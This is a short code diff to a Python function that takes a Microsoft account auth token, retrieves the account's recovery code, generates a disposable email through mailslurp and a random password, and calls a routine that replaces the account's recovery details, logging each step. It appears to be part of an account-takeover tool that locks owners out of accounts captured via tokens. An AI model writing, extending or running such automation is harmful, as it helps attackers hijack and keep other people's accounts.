@@ -172,14 +172,17 @@ def secure(msaauth: str):
                 )
                 print("[+] - Got Recovery Code")
 
-                accountInfo["recoveryCode"] = recoveryCode
-
                 new_email = generateEmail(mailslurp_key)
-                new_password = secrets.token_urlsafe(13)
+                print(f"[+] - Generated Email ({new_email})")
 
-                recoveryCodeSecure(email, recoveryCode, new_email, new_password) 
-            
-    
+                new_password = secrets.token_urlsafe(13)
+                print(f"[+] - Generated Password ({new_password})")
+
+                print("[~] - Automaticly Securing Account...")
+                newRCV = recoveryCodeSecure(email, recoveryCode, new_email, new_password, mailslurp_key) 
+                accountInfo["recoveryCode"] = newRCV
+                print("[+] - Account has been secured")
+
     return accountInfo
 
 
